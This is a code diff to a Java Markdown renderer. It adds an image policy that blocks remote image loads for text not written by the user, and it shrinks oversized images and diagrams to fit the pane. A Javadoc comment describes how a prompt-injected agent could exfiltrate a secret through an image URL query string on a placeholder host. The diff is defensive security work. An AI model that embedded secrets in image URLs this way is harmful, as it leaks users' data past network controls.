@@ -131,12 +131,49 @@ public final class MarkdownRenderer {
      */
     public static Node renderDocument(
             org.commonmark.node.Node ast, Path baseDir, java.util.function.Consumer<String> onLinkClick) {
+        return renderDocument(ast, baseDir, onLinkClick, ImagePolicy.DOCUMENT);
+    }
+
+    /**
+     * Which images a render may load. An image loads the moment it is rendered, with no click — so on a
+     * surface whose Markdown the user did not write, {@code ![](https://host/?d=<secret>)} is an outbound
+     * request somebody else chose. A prompt-injected agent can exfiltrate through it past its own network
+     * permissions; a language server's hover text or a pull-request body can do the same.
+     */
+    public enum ImagePolicy {
+        /** The user's own document (preview, print): files beside it, {@code data:} URIs, and public
+         *  {@code http(s)} hosts through {@link PreviewImageLoader}'s internal-address guard. */
+        DOCUMENT,
+        /** Text from elsewhere — agent replies, LSP hover / completion docs, PR bodies: only self-contained
+         *  {@code data:} URIs load; anything else renders as a placeholder naming the alt text and URL. */
+        DATA_ONLY;
+
+        /** Whether an image at {@code url} (already resolved to an absolute URL) may load. Pure; unit-tested. */
+        boolean allows(String url) {
+            if (url == null || url.isBlank()) {
+                return false;
+            }
+            return this == DOCUMENT || url.stripLeading().regionMatches(true, 0, "data:", 0, 5);
+        }
+    }
+
+    /** As {@link #renderDocument(org.commonmark.node.Node, Path, java.util.function.Consumer)}, with an
+     *  explicit {@link ImagePolicy} — every surface that renders Markdown it did not get from the user's own
+     *  file passes {@link ImagePolicy#DATA_ONLY}. */
+    public static Node renderDocument(
+            org.commonmark.node.Node ast,
+            Path baseDir,
+            java.util.function.Consumer<String> onLinkClick,
+            ImagePolicy images) {
         VBox content = new VBox();
         content.getStyleClass().add("markdown-preview");
         // Cap the readable column width so long lines don't stretch across a wide window (GitHub-style).
         content.setMaxWidth(MAX_CONTENT_WIDTH);
         if (ast != null) {
-            appendBlocks(ast, content, new RenderContext(baseDir, onLinkClick));
+            appendBlocks(
+                    ast,
+                    content,
+                    new RenderContext(baseDir, onLinkClick, images == null ? ImagePolicy.DATA_ONLY : images));
         }
         // Center the capped-width column within the (fit-to-width) preview pane. A StackPane clamps the
         // content to the available width when the viewport is narrower than the cap, so it never overflows.
@@ -149,7 +186,7 @@ public final class MarkdownRenderer {
     /** Threaded through every block/inline renderer alongside {@code baseDir} (for image resolution) so a
      *  link's click handler reaches the {@code Link} node without a parameter per call — the pure-{@code
      *  baseDir} idiom this file already used, extended to carry one more per-render input. */
-    private record RenderContext(Path baseDir, java.util.function.Consumer<String> onLinkClick) {}
+    private record RenderContext(Path baseDir, java.util.function.Consumer<String> onLinkClick, ImagePolicy images) {}
 
     // --- block level ---------------------------------------------------------------------------
 
@@ -175,12 +212,13 @@ public final class MarkdownRenderer {
                 if (disp != null) {
                     StackPane wrap = new StackPane(MathImages.blockNode(disp, DISPLAY_MATH_SIZE));
                     wrap.getStyleClass().add("md-math-block-wrap");
-                    return wrap;
+                    return new ShrinkToFit(wrap); // a long formula shrinks; it must not widen the column
                 }
             }
             // A paragraph that is just an image renders as a block image (not squeezed into a TextFlow).
             if (p.getFirstChild() instanceof org.commonmark.node.Image img && img.getNext() == null) {
-                return imageNode(img, ctx.baseDir());
+                // Fits a pane narrower than the image instead of widening the whole column.
+                return new ShrinkToFit(imageNode(img, ctx));
             }
             TextFlow tf = inlineFlow(p, ctx);
             tf.getStyleClass().add("md-paragraph");
@@ -201,8 +239,10 @@ public final class MarkdownRenderer {
         }
         if (node instanceof FencedCodeBlock f) {
             if (isMermaidInfo(f.getInfo()) && MermaidImages.isEnabled()) {
-                // Show at natural size, but never wider than the reading column.
-                return MermaidImages.node(stripTrailingNewline(f.getLiteral()), lw -> Math.min(lw, MAX_CONTENT_WIDTH));
+                // Show at natural size, but never wider than the reading column — and scaled down further
+                // when the pane itself is narrower (Split view), so the diagram never widens the column.
+                return new ShrinkToFit(MermaidImages.node(
+                        stripTrailingNewline(f.getLiteral()), lw -> Math.min(lw, MAX_CONTENT_WIDTH)));
             }
             return highlightedCodeBlock(f.getLiteral(), f.getInfo());
         }
@@ -581,7 +621,7 @@ public final class MarkdownRenderer {
             installLinkTooltip(flow, from, link.getDestination());
             installLinkClick(flow, from, link.getDestination(), ctx.onLinkClick());
         } else if (n instanceof org.commonmark.node.Image img) {
-            flow.getChildren().add(imageNode(img, ctx.baseDir()));
+            flow.getChildren().add(imageNode(img, ctx));
         } else if (n instanceof SoftLineBreak) {
             flow.getChildren().add(new Text(" "));
         } else if (n instanceof HardLineBreak) {
@@ -681,11 +721,14 @@ public final class MarkdownRenderer {
         }
     }
 
-    private static Node imageNode(org.commonmark.node.Image img, Path baseDir) {
+    private static Node imageNode(org.commonmark.node.Image img, RenderContext ctx) {
         String alt = imageAlt(img);
-        String url = resolveUrl(img.getDestination(), baseDir);
+        String url = resolveUrl(img.getDestination(), ctx.baseDir());
         if (url == null) {
-            return inlineCode(alt.isBlank() ? "[image]" : "[image: " + alt + "]");
+            return inlineCode(imagePlaceholder(alt, null));
+        }
+        if (!ctx.images().allows(url)) {
+            return inlineCode(imagePlaceholder(alt, img.getDestination())); // shown, never fetched
         }
         ImageView view = new ImageView();
         view.getStyleClass().add("md-image");
@@ -698,6 +741,20 @@ public final class MarkdownRenderer {
             Tooltip.install(view, new Tooltip(tip));
         }
         return view;
+    }
+
+    /** Longest URL tail shown in a blocked-image placeholder (a query string can be kilobytes). */
+    private static final int PLACEHOLDER_URL_MAX = 96;
+
+    /** The text shown in place of an image that is not loaded: {@code [image: alt]}, followed by the URL when
+     *  the image was <em>blocked</em> by the {@link ImagePolicy} (so the reader sees what was asked for). Pure. */
+    static String imagePlaceholder(String alt, String blockedUrl) {
+        String label = alt == null || alt.isBlank() ? "[image]" : "[image: " + alt.strip() + "]";
+        if (blockedUrl == null || blockedUrl.isBlank()) {
+            return label;
+        }
+        String url = blockedUrl.strip();
+        return label + " " + (url.length() > PLACEHOLDER_URL_MAX ? url.substring(0, PLACEHOLDER_URL_MAX) + "…" : url);
     }
 
     /** The alt text of an image (its inline text children). */
